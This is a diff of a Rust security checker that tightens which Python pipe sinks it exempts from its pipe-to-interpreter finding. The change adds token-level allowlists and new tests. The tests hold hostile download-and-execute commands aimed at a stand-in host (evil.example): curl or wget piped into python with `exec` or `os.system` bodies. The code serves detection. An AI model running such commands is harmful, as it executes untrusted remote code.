@@ -3211,21 +3211,16 @@ fn resolve_step_wrapper<'a>(
     ResolveStep::Stop
 }
 
-static PYTHON_CALL_TARGET_RE: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r"\b([A-Za-z_][A-Za-z0-9_]*(?:\.[A-Za-z_][A-Za-z0-9_]*)*)\s*\(")
-        .expect("PYTHON_CALL_TARGET_RE")
-});
-
-static PYTHON_IDENTIFIER_RE: Lazy<Regex> =
-    Lazy::new(|| Regex::new(r"\b[A-Za-z_][A-Za-z0-9_]*\b").expect("PYTHON_IDENTIFIER_RE"));
-
 /// Replace Python string/comment contents with spaces so identifiers inside data
-/// literals cannot influence the call-target allowlist. This is deliberately a
-/// small lexical recognizer, not a permissive Python parser: malformed quoting
-/// returns `None` and retains the pipe finding.
+/// literals cannot influence the name allowlist. This is deliberately a small
+/// lexical recognizer, not a permissive Python parser: malformed quoting returns
+/// `None` and retains the pipe finding. A string prefix other than `r`, `u`,
+/// `b`, `br` or `rb` (any case) also returns `None`: f-strings and t-strings
+/// evaluate the expressions inside their braces, so blanking them would hide
+/// code (`f"{exec(x)}"`).
 fn python_code_without_literals(body: &str) -> Option<String> {
     let chars: Vec<char> = body.chars().collect();
-    let mut out = String::with_capacity(body.len());
+    let mut out: Vec<char> = Vec::with_capacity(chars.len());
     let mut i = 0;
     while i < chars.len() {
         if chars[i] == '#' {
@@ -3236,12 +3231,28 @@ fn python_code_without_literals(body: &str) -> Option<String> {
             continue;
         }
         if matches!(chars[i], '\'' | '"') {
+            let prefix_len = out
+                .iter()
+                .rev()
+                .take_while(|ch| ch.is_ascii_alphanumeric() || **ch == '_')
+                .count();
+            if prefix_len > 0 {
+                let prefix: String = out[out.len() - prefix_len..]
+                    .iter()
+                    .collect::<String>()
+                    .to_ascii_lowercase();
+                if !matches!(prefix.as_str(), "r" | "u" | "b" | "br" | "rb") {
+                    return None;
+                }
+                let start = out.len() - prefix_len;
+                for ch in &mut out[start..] {
+                    *ch = ' ';
+                }
+            }
             let quote = chars[i];
             let triple = i + 2 < chars.len() && chars[i + 1] == quote && chars[i + 2] == quote;
             let width = if triple { 3 } else { 1 };
-            for _ in 0..width {
-                out.push(' ');
-            }
+            out.extend(std::iter::repeat_n(' ', width));
             i += width;
             let mut closed = false;
             while i < chars.len() {
@@ -3257,7 +3268,7 @@ fn python_code_without_literals(body: &str) -> Option<String> {
                         && chars[i + 1] == quote
                         && chars[i + 2] == quote
                     {
-                        out.push_str("   ");
+                        out.extend([' ', ' ', ' ']);
                         i += 3;
                         closed = true;
                         break;
@@ -3267,8 +3278,11 @@ fn python_code_without_literals(body: &str) -> Option<String> {
                     i += 1;
                     closed = true;
                     break;
+                } else if chars[i] == '\n' {
+                    // A single-quoted string cannot span lines.
+                    return None;
                 }
-                out.push(if chars[i] == '\n' { '\n' } else { ' ' });
+                out.push(' ');
                 i += 1;
             }
             if !closed {
@@ -3279,127 +3293,484 @@ fn python_code_without_literals(body: &str) -> Option<String> {
         out.push(chars[i]);
         i += 1;
     }
-    Some(out)
+    Some(out.into_iter().collect())
 }
 
-fn python_imports_are_data_only(code: &str) -> bool {
-    for statement in code.split([';', '\n']) {
-        let statement = statement.trim();
-        // Aliases can rebind an allowed call target (`import builtins as
-        // print`) and `from` imports can do the same indirectly. The carveout
-        // is deliberately narrower than Python: only direct module imports are
-        // accepted.
-        if statement.contains(" as ") || statement.starts_with("from ") {
-            return false;
-        }
-        let modules = if let Some(rest) = statement.strip_prefix("import ") {
-            rest
-        } else {
+/// Builtins a stdin data-transformation program may name. Each one only builds,
+/// converts or prints data; reflection (`getattr`, `vars`, `type`), code
+/// (`exec`, `eval`, `compile`, `__import__`), files (`open`), and anything
+/// that reads stdin as commands (`input`, `breakpoint`, `help`) are absent.
+const PYTHON_DATA_BUILTINS: &[&str] = &[
+    "print",
+    "len",
+    "str",
+    "int",
+    "float",
+    "bool",
+    "list",
+    "dict",
+    "set",
+    "tuple",
+    "sorted",
+    "reversed",
+    "enumerate",
+    "zip",
+    "range",
+    "min",
+    "max",
+    "sum",
+    "abs",
+    "round",
+    "any",
+    "all",
+    "repr",
+    "isinstance",
+];
+
+/// Modules a stdin data-transformation program may import and name.
+const PYTHON_DATA_MODULES: &[&str] = &["json", "sys", "re", "csv", "ast"];
+
+/// Python keywords a stdin data-transformation program may use. `lambda`,
+/// `def`, `class`, `with`, `from`, `as`, `global`, `del`, `try` and the rest are
+/// outside the grammar.
+const PYTHON_DATA_KEYWORDS: &[&str] = &[
+    "for", "in", "if", "elif", "else", "not", "and", "or", "is", "None", "True", "False", "pass",
+    "break", "continue", "import",
+];
+
+/// Methods of parsed data values: `str`, `list`, `dict`, regex patterns and
+/// matches, csv writers. None of them runs code or reaches interpreter state.
+/// `format` / `format_map` (attribute traversal) and `encode` / `decode` (codec
+/// lookup by name) are left out.
+const PYTHON_DATA_METHODS: &[&str] = &[
+    "strip",
+    "lstrip",
+    "rstrip",
+    "split",
+    "rsplit",
+    "splitlines",
+    "partition",
+    "rpartition",
+    "upper",
+    "lower",
+    "title",
+    "capitalize",
+    "casefold",
+    "swapcase",
+    "replace",
+    "startswith",
+    "endswith",
+    "removeprefix",
+    "removesuffix",
+    "join",
+    "find",
+    "rfind",
+    "count",
+    "index",
+    "isdigit",
+    "isalpha",
+    "isalnum",
+    "isspace",
+    "zfill",
+    "ljust",
+    "rjust",
+    "center",
+    "get",
+    "items",
+    "keys",
+    "values",
+    "copy",
+    "setdefault",
+    "update",
+    "append",
+    "extend",
+    "insert",
+    "pop",
+    "sort",
+    "reverse",
+    "add",
+    "match",
+    "search",
+    "fullmatch",
+    "findall",
+    "finditer",
+    "sub",
+    "subn",
+    "group",
+    "groups",
+    "groupdict",
+    "start",
+    "end",
+    "span",
+    "writerow",
+    "writerows",
+    "writeheader",
+];
+
+/// The attributes a data program may read from an allowed module (or from
+/// `sys`'s standard streams). `sys.modules`, `sys.stdin.buffer` and the like
+/// are absent, so no chain reaches another module or the interpreter.
+fn python_module_attribute_allowed(owner: &str, attribute: &str) -> bool {
+    match owner {
+        "json" => matches!(
+            attribute,
+            "load" | "loads" | "dump" | "dumps" | "JSONDecodeError"
+        ),
+        "sys" => matches!(attribute, "stdin" | "stdout" | "stderr" | "argv" | "exit"),
+        "sys.stdin" => matches!(attribute, "read" | "readline" | "readlines"),
+        "sys.stdout" | "sys.stderr" => matches!(attribute, "write" | "flush"),
+        "re" => matches!(
+            attribute,
+            "compile"
+                | "match"
+                | "search"
+                | "fullmatch"
+                | "findall"
+                | "finditer"
+                | "sub"
+                | "subn"
+                | "split"
+                | "escape"
+                | "I"
+                | "IGNORECASE"
+                | "M"
+                | "MULTILINE"
+                | "S"
+                | "DOTALL"
+        ),
+        "csv" => matches!(attribute, "reader" | "DictReader" | "writer" | "DictWriter"),
+        "ast" => attribute == "literal_eval",
+        _ => false,
+    }
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+enum PythonToken {
+    Name(String),
+    Number,
+    Punct(&'static str),
+    /// A statement boundary: newline or `;`.
+    End,
+}
+
+/// Lex literal-free Python code into the tokens the data grammar accepts.
+/// `None` for any byte outside that grammar (non-ASCII identifiers, which
+/// Python folds with NFKC so `ｅｘｅｃ` is `exec`; `@`; backslash continuations;
+/// the walrus `:=`).
+fn python_data_tokens(code: &str) -> Option<Vec<PythonToken>> {
+    const PUNCT: &[&str] = &[
+        "**=", "//=", ">>=", "<<=", "==", "!=", "<=", ">=", "**", "//", "<<", ">>", "+=", "-=",
+        "*=", "/=", "%=", "&=", "|=", "^=", "(", ")", "[", "]", "{", "}", ",", ":", ".", "+", "-",
+        "*", "/", "%", "<", ">", "=", "&", "|", "^", "~",
+    ];
+    if !code.is_ascii() || code.contains(":=") {
+        return None;
+    }
+    let bytes = code.as_bytes();
+    let mut tokens = Vec::new();
+    let mut depth = 0usize;
+    let mut index = 0usize;
+    while index < bytes.len() {
+        let byte = bytes[index];
+        // Inside brackets a newline only joins lines; `;` still ends the
+        // statement (and leaves the brackets unbalanced, which is refused).
+        if (byte == b'\n' && depth == 0) || byte == b';' {
+            tokens.push(PythonToken::End);
+            index += 1;
             continue;
-        };
-        for module in modules.split(',') {
-            let module = module.split_whitespace().next().unwrap_or("");
-            let root = module.split('.').next().unwrap_or("");
-            if !matches!(root, "json" | "ast" | "re" | "sys") {
-                return false;
+        }
+        if byte.is_ascii_whitespace() {
+            index += 1;
+            continue;
+        }
+        if byte.is_ascii_alphabetic() || byte == b'_' {
+            let start = index;
+            while index < bytes.len()
+                && (bytes[index].is_ascii_alphanumeric() || bytes[index] == b'_')
+            {
+                index += 1;
+            }
+            tokens.push(PythonToken::Name(code[start..index].to_string()));
+            continue;
+        }
+        if byte.is_ascii_digit()
+            || (byte == b'.' && bytes.get(index + 1).is_some_and(u8::is_ascii_digit))
+        {
+            index = python_number_end(bytes, index)?;
+            tokens.push(PythonToken::Number);
+            continue;
+        }
+        let punct = PUNCT
+            .iter()
+            .find(|punct| bytes[index..].starts_with(punct.as_bytes()))?;
+        match *punct {
+            "(" | "[" | "{" => depth += 1,
+            ")" | "]" | "}" => depth = depth.saturating_sub(1),
+            _ => {}
+        }
+        tokens.push(PythonToken::Punct(punct));
+        index += punct.len();
+    }
+    Some(tokens)
+}
+
+/// The end of the Python number literal starting at `start`, or `None` when a
+/// name character is glued to it. Python reads `1or x` as `1 or x`, so a
+/// greedy scan could hide a keyword inside a "number".
+fn python_number_end(bytes: &[u8], start: usize) -> Option<usize> {
+    let digits = |index: &mut usize, accept: fn(u8) -> bool| {
+        while *index < bytes.len() && (accept(bytes[*index]) || bytes[*index] == b'_') {
+            *index += 1;
+        }
+    };
+    let mut index = start;
+    let radix = bytes.get(start) == Some(&b'0')
+        && bytes
+            .get(start + 1)
+            .is_some_and(|byte| matches!(byte, b'x' | b'X' | b'o' | b'O' | b'b' | b'B'));
+    if radix {
+        index += 2;
+        digits(&mut index, |byte| byte.is_ascii_hexdigit());
+    } else {
+        digits(&mut index, |byte| byte.is_ascii_digit());
+        if bytes.get(index) == Some(&b'.') {
+            index += 1;
+            digits(&mut index, |byte| byte.is_ascii_digit());
+        }
+        if bytes
+            .get(index)
+            .is_some_and(|byte| matches!(byte, b'e' | b'E'))
+        {
+            index += 1;
+            if bytes
+                .get(index)
+                .is_some_and(|byte| matches!(byte, b'+' | b'-'))
+            {
+                index += 1;
+            }
+            let exponent = index;
+            digits(&mut index, |byte| byte.is_ascii_digit());
+            if index == exponent {
+                return None;
+            }
+        }
+        if bytes
+            .get(index)
+            .is_some_and(|byte| matches!(byte, b'j' | b'J'))
+        {
+            index += 1;
+        }
+    }
+    if bytes
+        .get(index)
+        .is_some_and(|byte| byte.is_ascii_alphanumeric() || *byte == b'_' || *byte == b'.')
+    {
+        return None;
+    }
+    Some(index)
+}
+
+fn python_token_is(token: Option<&PythonToken>, punct: &str) -> bool {
+    matches!(token, Some(PythonToken::Punct(p)) if *p == punct)
+}
+
+/// Positive, deliberately narrow issue-136 carveout: a program that reads stdin
+/// and only transforms it as data. Every name must be an allowed builtin,
+/// module, keyword, or a local variable the program binds itself; every
+/// attribute must be on the module allowlist or a data-value method; imports
+/// name only the allowed modules; no binding shadows an allowed name. Anything
+/// else (reflection, aliases, unknown calls, unsupported syntax) retains the
+/// High pipe-to-interpreter finding.
+fn python_body_is_known_data_parser(body: &str) -> bool {
+    let Some(code) = python_code_without_literals(body) else {
+        return false;
+    };
+    if code.contains("__") {
+        return false;
+    }
+    let Some(tokens) = python_data_tokens(&code) else {
+        return false;
+    };
+    let reserved = |name: &str| {
+        PYTHON_DATA_BUILTINS.contains(&name)
+            || PYTHON_DATA_MODULES.contains(&name)
+            || PYTHON_DATA_KEYWORDS.contains(&name)
+    };
+
+    // Pass 1: the names the program binds (assignment and `for` targets), and
+    // the keyword-argument names. A binding of an allowed name, or of an
+    // attribute (`sys.stdin.read = ...`), is outside the grammar.
+    let mut locals = BTreeSet::new();
+    let mut keyword_arguments = BTreeSet::new();
+    let mut depth = 0isize;
+    let mut statement_start = 0usize;
+    let mut reads_stdin = false;
+    for (index, token) in tokens.iter().enumerate() {
+        match token {
+            PythonToken::End => {
+                if depth != 0 {
+                    return false;
+                }
+                statement_start = index + 1;
+            }
+            PythonToken::Punct("(" | "[" | "{") => depth += 1,
+            PythonToken::Punct(")" | "]" | "}") => {
+                depth -= 1;
+                if depth < 0 {
+                    return false;
+                }
+            }
+            // A compound header (`for l in sys.stdin:`) ends where its body
+            // statement starts.
+            PythonToken::Punct(":") if depth == 0 => statement_start = index + 1,
+            PythonToken::Punct(
+                "=" | "+=" | "-=" | "*=" | "/=" | "//=" | "%=" | "**=" | ">>=" | "<<=" | "&="
+                | "|=" | "^=",
+            ) => {
+                if depth > 0 {
+                    // `name=value` inside a call is a keyword argument.
+                    match index.checked_sub(1).map(|previous| &tokens[previous]) {
+                        Some(PythonToken::Name(name)) if *token == PythonToken::Punct("=") => {
+                            keyword_arguments.insert(name.clone());
+                        }
+                        _ => return false,
+                    }
+                    continue;
+                }
+                let mut target_depth = 0isize;
+                for (offset, target) in tokens[statement_start..index].iter().enumerate() {
+                    match target {
+                        PythonToken::Punct("(" | "[" | "{") => target_depth += 1,
+                        PythonToken::Punct(")" | "]" | "}") => target_depth -= 1,
+                        PythonToken::Punct(".") if target_depth == 0 => return false,
+                        PythonToken::Name(name) if target_depth == 0 => {
+                            let previous = (statement_start + offset)
+                                .checked_sub(1)
+                                .map(|previous| &tokens[previous]);
+                            if reserved(name) || python_token_is(previous, ".") {
+                                return false;
+                            }
+                            locals.insert(name.clone());
+                        }
+                        _ => {}
+                    }
+                }
+            }
+            PythonToken::Name(name) if name == "for" => {
+                let mut cursor = index + 1;
+                while let Some(target) = tokens.get(cursor) {
+                    match target {
+                        PythonToken::Name(name) if name == "in" => break,
+                        PythonToken::Name(name) if !reserved(name) => {
+                            locals.insert(name.clone());
+                        }
+                        PythonToken::Punct("," | "(" | ")") => {}
+                        _ => return false,
+                    }
+                    cursor += 1;
+                }
+                if cursor >= tokens.len() {
+                    return false;
+                }
+            }
+            PythonToken::Name(name) if name == "stdin" => {
+                reads_stdin |= index >= 2
+                    && python_token_is(tokens.get(index - 1), ".")
+                    && matches!(&tokens[index - 2], PythonToken::Name(owner) if owner == "sys");
+            }
+            _ => {}
+        }
+    }
+    if depth != 0 || !reads_stdin {
+        return false;
+    }
+
+    // Pass 2: every name and attribute is on the grammar.
+    let mut statement_start = true;
+    let mut in_import = false;
+    for (index, token) in tokens.iter().enumerate() {
+        let at_start = std::mem::replace(&mut statement_start, false);
+        match token {
+            PythonToken::End => {
+                statement_start = true;
+                in_import = false;
+            }
+            PythonToken::Punct(":") => statement_start = true,
+            PythonToken::Punct(",") if in_import => {}
+            PythonToken::Number | PythonToken::Punct(_) => {
+                if in_import {
+                    return false;
+                }
+            }
+            PythonToken::Name(name) if in_import => {
+                if !PYTHON_DATA_MODULES.contains(&name.as_str()) {
+                    return false;
+                }
+            }
+            PythonToken::Name(name) if name == "import" => {
+                if !at_start {
+                    return false;
+                }
+                in_import = true;
+            }
+            PythonToken::Name(name) => {
+                let previous = index.checked_sub(1).map(|previous| &tokens[previous]);
+                if python_token_is(previous, ".") {
+                    if !python_attribute_allowed(&tokens, index, &locals) {
+                        return false;
+                    }
+                    continue;
+                }
+                let keyword_argument =
+                    python_token_is(tokens.get(index + 1), "=") && keyword_arguments.contains(name);
+                if !(reserved(name) || locals.contains(name) || keyword_argument) {
+                    return false;
+                }
             }
         }
     }
     true
 }
 
-fn python_has_rebinding_or_dynamic_primitive(code: &str) -> bool {
-    let bytes = code.as_bytes();
-    for (index, byte) in bytes.iter().enumerate() {
-        if *byte != b'=' {
-            continue;
-        }
-        let previous = index.checked_sub(1).and_then(|i| bytes.get(i)).copied();
-        let next = bytes.get(index + 1).copied();
-        if !matches!(previous, Some(b'=') | Some(b'!') | Some(b'<') | Some(b'>'))
-            && next != Some(b'=')
-        {
-            // A data-only parser commonly assigns parsed values (`doc =
-            // json.load(...)`). That is safe and is part of the original issue
-            // #136 use case. Reject assignments only when they can rebind a
-            // callable/module name admitted by the allowlist below. This still
-            // covers ordinary, annotated, destructuring, augmented, and walrus
-            // assignment without turning every local data variable into a false
-            // positive.
-            let statement_start = code[..index]
-                .rfind([';', '\n'])
-                .map_or(0, |delimiter| delimiter + 1);
-            let before = &code[statement_start..index];
-
-            // `name=value` inside a call is a keyword argument, not a rebinding.
-            // A walrus (`name := value`) is an assignment even when nested.
-            let mut nesting = 0isize;
-            for ch in before.chars() {
-                match ch {
-                    '(' | '[' | '{' => nesting += 1,
-                    ')' | ']' | '}' => nesting -= 1,
-                    _ => {}
-                }
-            }
-            if nesting > 0 && previous != Some(b':') {
-                continue;
-            }
-
-            let mut target = before.trim();
-            target = target.trim_end_matches([':', '+', '-', '*', '/', '%', '&', '|', '^', '@']);
-            if let Some(colon) = target.rfind(':') {
-                let prefix = target[..colon].trim_start();
-                target = if ["if ", "elif ", "while ", "for ", "with "]
-                    .iter()
-                    .any(|keyword| prefix.starts_with(keyword))
-                {
-                    target[colon + 1..].trim()
-                } else {
-                    // Annotated assignment (`name: Type = value`).
-                    target[..colon].trim()
-                };
-            }
-            if PYTHON_IDENTIFIER_RE.find_iter(target).any(|identifier| {
-                matches!(
-                    identifier.as_str(),
-                    "json"
-                        | "ast"
-                        | "re"
-                        | "sys"
-                        | "print"
-                        | "len"
-                        | "str"
-                        | "int"
-                        | "float"
-                        | "bool"
-                        | "list"
-                        | "dict"
-                        | "set"
-                        | "tuple"
-                        | "sorted"
-                        | "enumerate"
-                        | "zip"
-                        | "range"
-                )
-            }) {
-                return true;
-            }
-        }
+/// Whether the attribute name at `tokens[index]` (after a `.`) is allowed: on
+/// the allowlist of the module chain it hangs off (`sys.stdin.read`), or a
+/// data-value method when its owner is any other expression.
+fn python_attribute_allowed(
+    tokens: &[PythonToken],
+    index: usize,
+    locals: &BTreeSet<String>,
+) -> bool {
+    let PythonToken::Name(attribute) = &tokens[index] else {
+        return false;
+    };
+    // Walk the dotted name chain that owns this attribute back to its root.
+    let mut chain: Vec<&str> = Vec::new();
+    let mut cursor = index;
+    while cursor >= 2 && python_token_is(tokens.get(cursor - 1), ".") {
+        let PythonToken::Name(owner) = &tokens[cursor - 2] else {
+            break;
+        };
+        chain.push(owner);
+        cursor -= 2;
     }
-    PYTHON_IDENTIFIER_RE.find_iter(code).any(|identifier| {
-        matches!(
-            identifier.as_str(),
-            "exec" | "eval" | "compile" | "__import__"
-        ) && identifier
-            .start()
-            .checked_sub(1)
-            .and_then(|index| code.as_bytes().get(index))
-            != Some(&b'.')
-    })
+    chain.reverse();
+    let rooted_at_module =
+        cursor >= 1 && !python_token_is(tokens.get(cursor - 1), ".") || cursor == 0;
+    match chain.first() {
+        Some(root)
+            if rooted_at_module
+                && PYTHON_DATA_MODULES.contains(root)
+                && !locals.contains(*root) =>
+        {
+            python_module_attribute_allowed(&chain.join("."), attribute)
+        }
+        _ => PYTHON_DATA_METHODS.contains(&attribute.as_str()),
+    }
 }
 
-/// A complete Python program that only prints a decimal constant (or a
-/// newline). No literal stripping or call-target inference is needed here.
+/// A complete Python program that only prints a constant: nothing, a decimal
+/// number, or one plain (unprefixed, single-line) string literal. It reads no
+/// stdin and names nothing but `print`.
 pub(crate) fn python_body_is_literal_output(body: &str) -> bool {
     let body = body.trim();
     let Some(argument) = body
@@ -3409,73 +3780,61 @@ pub(crate) fn python_body_is_literal_output(body: &str) -> bool {
         return false;
     };
     let argument = argument.trim();
-    argument.is_empty() || argument.bytes().all(|byte| byte.is_ascii_digit())
-}
-
-/// Positive, deliberately narrow issue-136 carveout. Every call target must be
-/// a known data parser/reader or inert builtin; reflection, aliases, unresolved
-/// calls, and unsupported syntax retain the High pipe-to-interpreter finding.
-fn python_body_is_known_data_parser(body: &str) -> bool {
-    let Some(code) = python_code_without_literals(body) else {
-        return false;
-    };
-    if code.contains("__")
-        || python_has_rebinding_or_dynamic_primitive(&code)
-        || !python_imports_are_data_only(&code)
-    {
+    if argument.is_empty() || argument.bytes().all(|byte| byte.is_ascii_digit()) {
+        return true;
+    }
+    let bytes = argument.as_bytes();
+    let quote = bytes[0];
+    if !matches!(quote, b'\'' | b'"') || bytes.len() < 2 || bytes[bytes.len() - 1] != quote {
         return false;
     }
-    let has_stdin_parser = code.contains("sys.stdin")
-        && (code.contains("json.load")
-            || code.contains("ast.literal_eval")
-            || code.contains(".read(")
-            || code.contains(".readline(")
-            || code.contains(" in sys.stdin"));
-    if !has_stdin_parser {
-        return false;
+    let inner = &bytes[1..bytes.len() - 1];
+    let mut index = 0usize;
+    while index < inner.len() {
+        match inner[index] {
+            b'\n' | b'\r' => return false,
+            b'\\' => {
+                if index + 1 >= inner.len() || matches!(inner[index + 1], b'\n' | b'\r') {
+                    return false;
+                }
+                index += 2;
+            }
+            byte if byte == quote => return false,
+            _ => index += 1,
+        }
     }
-
-    PYTHON_CALL_TARGET_RE.captures_iter(&code).all(|capture| {
-        let target = capture.get(1).map(|m| m.as_str()).unwrap_or("");
-        matches!(
-            target,
-            "json.load"
-                | "json.loads"
-                | "ast.literal_eval"
-                | "sys.stdin.read"
-                | "sys.stdin.readline"
-                | "re.compile"
-                | "print"
-                | "len"
-                | "str"
-                | "int"
-                | "float"
-                | "bool"
-                | "list"
-                | "dict"
-                | "set"
-                | "tuple"
-                | "sorted"
-                | "enumerate"
-                | "zip"
-                | "range"
-        ) || target.ends_with(".match")
-            || target.ends_with(".search")
-            || target.ends_with(".fullmatch")
-            || target.ends_with(".group")
-            || target.ends_with(".groups")
-            || target.ends_with(".groupdict")
-    })
+    true
 }
 
-/// True when `seg` is a DIRECT `python`/`python2`/`python3 -c <body>` invocation
-/// (no sudo/env/command wrapper leader) whose `<body>` contains no dynamic
-/// code-execution primitive. Such a body consumes piped stdin as DATA for a fixed
-/// program, so a non-fetch producer piped into it is not "downloaded content
-/// executed without inspection" (issue #136). Wrapped forms (`sudo python -c ...`)
-/// fail the direct-leader check, and bare `python` / `python -` have no `-c` body
-/// (stdin IS the program), so all of those keep the pipe-to-interpreter finding.
-fn is_python_dash_c_data_pipeline(seg: &tokenize::Segment, shell: ShellType) -> bool {
+/// Whether `seg` is a direct python pipe sink whose fixed program only reads
+/// its standard input as data or ignores it ([`python_pipe_sink_data_program`]).
+/// URL-shaped words in such a program (`-m json.tool`) are not fetched or run.
+pub(crate) fn python_pipe_sink_is_data_program(seg: &tokenize::Segment, shell: ShellType) -> bool {
+    python_pipe_sink_data_program(seg, shell).is_some()
+}
+
+/// What a direct python pipe sink is proven to do with its standard input.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+enum PythonDataSink {
+    /// `python -c 'print("done")'`: ignores stdin.
+    LiteralOutput,
+    /// `python -m json.tool` or a `-c` body on the data grammar: parses stdin
+    /// as data and never runs it.
+    DataParser,
+}
+
+/// What `seg` proves when it is a DIRECT `python`/`python2`/`python3` pipe
+/// sink (no sudo/env/command wrapper leader): a `-c <body>` that only prints a
+/// constant or only transforms stdin as data, or `-m json.tool` with only its
+/// own formatting flags. Such a program consumes piped stdin as DATA, so the
+/// pipe is not "content executed without inspection" (issue #136). Wrapped
+/// forms (`sudo python -c ...`) fail the direct-leader check, and bare `python`
+/// / `python -` have no fixed program (stdin IS the program), so all of those
+/// keep the pipe-to-interpreter finding.
+fn python_pipe_sink_data_program(
+    seg: &tokenize::Segment,
+    shell: ShellType,
+) -> Option<PythonDataSink> {
     // This proof is for an actual POSIX or fish pipe with no redirection.
     // Other shells and any redirection keep the ordinary interpreter finding.
     // A leading assignment is refused because it may set PYTHONINSPECT (or
@@ -3497,21 +3856,26 @@ fn is_python_dash_c_data_pipeline(seg: &tokenize::Segment, shell: ShellType) -> 
         || !tokenize::leading_env_assignments(&seg.raw).is_empty()
         || seg.args.iter().any(redirection)
     {
-        return false;
+        return None;
     }
-    let Some(cmd) = seg.command.as_deref() else {
-        return false;
-    };
+    let cmd = seg.command.as_deref()?;
     if !matches!(
         normalize_cmd_base(cmd, shell).as_str(),
         "python" | "python2" | "python3"
     ) {
-        return false;
+        return None;
     }
-    let Some(body) = crate::extract::literal_python_inline_program(&seg.args, shell) else {
-        return false;
-    };
-    python_body_is_literal_output(&body) || python_body_is_known_data_parser(&body)
+    if crate::extract::literal_python_json_tool_invocation(&seg.args, shell) {
+        return Some(PythonDataSink::DataParser);
+    }
+    let body = crate::extract::literal_python_inline_program(&seg.args, shell)?;
+    if python_body_is_literal_output(&body) {
+        Some(PythonDataSink::LiteralOutput)
+    } else if python_body_is_known_data_parser(&body) {
+        Some(PythonDataSink::DataParser)
+    } else {
+        None
+    }
 }
 
 /// Interpreters that directly receive a URL-fetch command's output through a
@@ -3813,7 +4177,7 @@ fn segment_may_enable_python_inspect(
     // and a literal `unset` run nothing that could change the shell's
     // environment, even when they mention PYTHONINSPECT (`unset PYTHONINSPECT`
     // turns inspect mode off).
-    if is_python_dash_c_data_pipeline(seg, shell) || segment_is_literal_unset(seg, shell) {
+    if python_pipe_sink_data_program(seg, shell).is_some() || segment_is_literal_unset(seg, shell) {
         return false;
     }
     if seg.raw.contains("PYTHONINSPECT") {
@@ -4032,14 +4396,21 @@ fn check_pipe_to_interpreter(
                     let source_base = normalize_cmd_base(source_cmd_ref, shell);
                     let source_label = source_base.clone();
 
-                    // Issue #136: a DIRECT `python -c <body>` whose body only reads
-                    // stdin as DATA (no exec/eval/os.system/os.popen/subprocess/
-                    // __import__ primitive) is a static parser, not "downloaded
-                    // content executed". Suppress ONLY for a non-fetch producer;
-                    // curl / wget / fetch / http(s) / xh piped into python keep
-                    // blocking via the fetch-source path below.
-                    if !is_url_fetch_command(&source_base)
-                        && is_python_dash_c_data_pipeline(seg, shell)
+                    // Issue #136: a DIRECT `python -c <body>` or `python -m
+                    // json.tool` whose program only reads stdin as DATA is a
+                    // static parser, not "content executed". A downloaded
+                    // producer (curl / wget / http(s) / xh) is exempt only for a
+                    // proven data parser: the bytes are parsed, never run. A
+                    // program that ignores stdin (`print("done")`) is exempt for
+                    // a local producer only. Inspect mode (PYTHONINSPECT, `-i`)
+                    // would run the rest of the pipe as code, so any way the
+                    // input may enable it keeps the finding.
+                    let exempt = match python_pipe_sink_data_program(seg, shell) {
+                        Some(PythonDataSink::DataParser) => true,
+                        Some(PythonDataSink::LiteralOutput) => !is_url_fetch_command(&source_base),
+                        None => false,
+                    };
+                    if exempt
                         && !inspect_may_be_enabled
                             .get_or_insert_with(|| inherited_inspect.extend(segments, shell))
                             .may_enable
@@ -14931,30 +15302,212 @@ mod tests {
 
     #[test]
     fn issue_136_fetch_sources_and_wrappers_keep_blocking() {
-        // curl|python is downloaded-code execution, untouched by the carveout.
-        let curl = check_default(
-            "curl https://evil.example/x.py | python -c 'json.load(sys.stdin)'",
-            ShellType::Posix,
-        );
-        assert!(
-            curl.iter()
-                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
-            "curl piped into python -c must still block"
-        );
-        // wget|python likewise.
+        // A download piped into a program that runs stdin, or into a `-c`
+        // body outside the data grammar, is downloaded-code execution.
+        for input in [
+            "curl https://evil.example/x.py | python",
+            "curl https://evil.example/x.py | python -",
+            "curl https://evil.example/x.py | python -c 'import sys; exec(sys.stdin.read())'",
+            "curl https://evil.example/x.py | python -c 'import sys,os; os.system(sys.stdin.read())'",
+            "curl https://evil.example/x.py | python3 -i -m json.tool",
+            "curl https://evil.example/x.py | python3 -m json.tool -i",
+            // A program that ignores stdin is exempt for a local producer only.
+            "curl https://evil.example/x.py | python3 -c 'print(1)'",
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings.iter().any(|f| matches!(
+                    f.rule_id,
+                    RuleId::CurlPipeShell | RuleId::PipeToInterpreter
+                )),
+                "{input}: {findings:?}"
+            );
+        }
         let wget = check_default(
-            "wget -O- https://evil.example/x.py | python -c 'json.load(sys.stdin)'",
+            "wget -O- https://evil.example/x.py | python -c 'import sys; exec(sys.stdin.read())'",
             ShellType::Posix,
         );
         assert!(
             wget.iter()
                 .any(|f| matches!(f.rule_id, RuleId::WgetPipeShell | RuleId::PipeToInterpreter)),
-            "wget piped into python -c must still block"
+            "wget piped into an exec body must still block"
         );
         // A wrapped interpreter (sudo) fails the direct-leader check and stays a
         // finding even with a data-only body.
         assert!(fires_pipe_to_interpreter(
             "printf '{}' | sudo python -c 'json.load(sys.stdin)'"
+        ));
+        assert!(fires_pipe_to_interpreter(
+            "printf '{}' | sudo python3 -m json.tool"
+        ));
+    }
+
+    #[test]
+    fn fpperf_1_downloaded_data_into_a_proven_data_parser_passes() {
+        // The bytes are parsed as JSON or transformed as data, never run.
+        for input in [
+            "curl -s https://api.example.com/x | python3 -m json.tool",
+            "curl -fsSL https://api.example.com/x | python3 -m json.tool --sort-keys",
+            "wget -qO- https://api.example.com/x | python -m json.tool --indent 2",
+            r#"curl -s https://api.example.com/x | python3 -c 'import json,sys; print(json.load(sys.stdin)["name"])'"#,
+            "curl -s https://api.example.com/x | python3 -c 'import json,sys; print(json.dumps(json.load(sys.stdin), indent=2))'",
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings.iter().all(|f| !matches!(
+                    f.rule_id,
+                    RuleId::CurlPipeShell
+                        | RuleId::WgetPipeShell
+                        | RuleId::PipeToInterpreter
+                        | RuleId::AnalysisIncomplete
+                )),
+                "{input}: {findings:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn fpperf_1_json_tool_is_a_data_parser_only_with_its_own_flags() {
+        for input in [
+            "cat package.json | python3 -m json.tool",
+            "gh api repos/o/r | python3 -m json.tool",
